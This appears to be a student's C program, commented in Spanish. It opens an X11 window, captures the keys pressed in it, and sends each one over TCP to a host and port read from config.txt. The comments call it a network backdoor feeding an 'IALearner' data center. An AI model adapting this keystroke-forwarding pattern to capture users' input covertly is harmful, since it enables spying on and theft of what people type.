#include <X11/Xlib.h>
#include <X11/keysym.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h> // LIBRERÍAS DE RED AÑADIDAS
#include <signal.h>
#include <sys/socket.h> //para ver la conexion de los pipes

int main(int argc, char *argv[]) {
    
    char *id_proceso = "X";
    if (argc > 1) {
        id_proceso = argv[1]; 
    }

    // para leer el archivo y encontrar la ip
    FILE *archivo = fopen("config.txt", "r");
    if (archivo == NULL) {
        printf("[-] proceso%s: Error. No se encontró el archivo config.txt\n", id_proceso);
        return -1;
    }
    
    char puerto_str[20], ip_str[50];
    fgets(puerto_str, sizeof(puerto_str), archivo); // Lee primera línea (puerto)
    fgets(ip_str, sizeof(ip_str), archivo);         // Lee segunda línea (IP)
    fclose(archivo);
    
    // Limpiamos los saltos de línea (\n) invisibles que se leen del archivo de texto
    puerto_str[strcspn(puerto_str, "\n")] = 0;
    ip_str[strcspn(ip_str, "\n")] = 0;
    
    int puerto_config = atoi(puerto_str);

    // --- 1. CONFIGURACIÓN DEL SOCKET (BACKDOOR DE RED) ---
    int sock = 0;
    struct sockaddr_in serv_addr;

    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
        printf("[-] proceso%s: Error en la creación del socket\n", id_proceso);
        return -1;
    }

    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(puerto_config);

    // Convertir la IP a binario (127.0.0.1 es tu propia máquina simulando el servidor remoto)
    if (inet_pton(AF_INET, ip_str, &serv_addr.sin_addr) <= 0) {
        printf("[-] proceso%s-%s: Dirección inválida\n", id_proceso, ip_str);
        return -1;
    }

    // Conectarse al Servidor IALearner
    if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {
        printf("[-] proceso%s: Conexión fallida. ¿Está el IALearner encendido?\n", id_proceso);
        return -1;
    }

    signal(SIGPIPE, SIG_IGN); // Ignorar la señal de muerte por red caída
    // -----------------------------------------------------

    Display *display = XOpenDisplay(NULL);
    if (!display) {
        fprintf(stderr, "Cannot open display\n");
        return 1;
    }

    int screen = DefaultScreen(display);
    Window window = XCreateSimpleWindow(
        display, RootWindow(display, screen),
        10, 10, 400, 200, 1,
        BlackPixel(display, screen), WhitePixel(display, screen)
    );

    XSelectInput(display, window, ExposureMask | KeyPressMask);
    XMapWindow(display, window);
    // ---> NUEVA DEFENSA: Capturar el clic en la "X" <---
    Atom wmDeleteMessage = XInternAtom(display, "WM_DELETE_WINDOW", False);
    XSetWMProtocols(display, window, &wmDeleteMessage, 1);
    // ---------------------------------------------------
    XEvent event;

    while (1) {
        XNextEvent(display, &event);
	// ---> NUEVA DEFENSA: ¿El usuario hizo clic en la "X"? <---
        if (event.type == ClientMessage) {
            if (event.xclient.data.l[0] == wmDeleteMessage) {
                printf("[!] proceso%s: Ventana cerrada desde la 'X'. Saliendo limpiamente...\n", id_proceso);
                break; // Rompe el bucle infinito
            }
        }
        // ---------------------------------------------------------

        if (event.type == KeyPress) {
            KeySym keysym = XLookupKeysym(&event.xkey, 0);
            char *name = XKeysymToString(keysym);
            
            if (name) {
		// ---> NUEVA DEFENSA ABSOLUTA: EL RADAR TCP <---
                char radar_buffer[1];
                // Espiamos el socket sin bloquear el programa
                int estado_radar = recv(sock, radar_buffer, 1, MSG_DONTWAIT | MSG_PEEK);
                
                // Si recv devuelve 0, el servidor del otro lado se apagó/murió
                if (estado_radar == 0) {
                    printf("[-] proceso%s: [Radar] El Data Center se cayó. Abortando envío...\n", id_proceso);
                    break; // Salimos ANTES de que el send() cause un problema
                } //muere la defensa
                // --- EL BACKDOOR EN ACCIÓN ---
                // Formateamos el mensaje (Ej: "P1: a")
                char mensaje[50];
                sprintf(mensaje, "P%s: %s", id_proceso, name);
                
                // Disparamos el mensaje por la red
                if (send(sock, mensaje, strlen(mensaje), 0) < 0) {
    			printf("[-] proceso%s: El IALearner se cayó. Cerrando ventana por seguridad...\n", id_proceso);
    			break; // Esto rompe el bucle infinito y permite que ejecute XDestroyWindow y close(sock)
		}
                
                // Printf defensivo local solo para saber que sí se envió
                printf("proceso%s -> Letra '%s' enviada al Data Center.\n", id_proceso, name);
            }

            // Según la rúbrica, la captura termina con Return (Enter) o Escape
            if (keysym == XK_Escape || keysym == XK_Return)
                break;
        }
    }

    close(sock); // Cerrar conexión de red limpiamente
    XDestroyWindow(display, window);
    XCloseDisplay(display);
    return 0;
}
